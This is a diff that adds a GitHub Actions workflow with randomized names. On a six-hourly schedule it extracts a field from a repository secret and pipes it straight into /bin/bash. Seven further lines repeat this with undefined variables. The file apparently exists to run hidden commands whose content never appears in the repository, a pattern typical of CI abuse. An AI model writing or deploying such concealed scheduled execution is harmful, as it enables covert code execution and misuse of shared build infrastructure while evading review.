@@ -1,0 +1,25 @@
+name: yanjingwu1819
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanjingwu1819
+        env:
+          y88170: ${{ secrets.y88170 }}
+        run: |
+          echo $y88170 | jq -r .vuh5112 | /bin/bash
+          echo $gm1 | jq -r .cmy604 | /bin/bash
+          echo $xo15 | jq -r .oct3911 | /bin/bash
+          echo $g5 | jq -r .zdxc4 | /bin/bash
+          echo $wmwxu4312 | jq -r .d3437 | /bin/bash
+          echo $l1 | jq -r .rddi1 | /bin/bash
+          echo $imm1720 | jq -r .edfa3777 | /bin/bash
+          echo $hii1277 | jq -r .qhqfi4 | /bin/bash
+
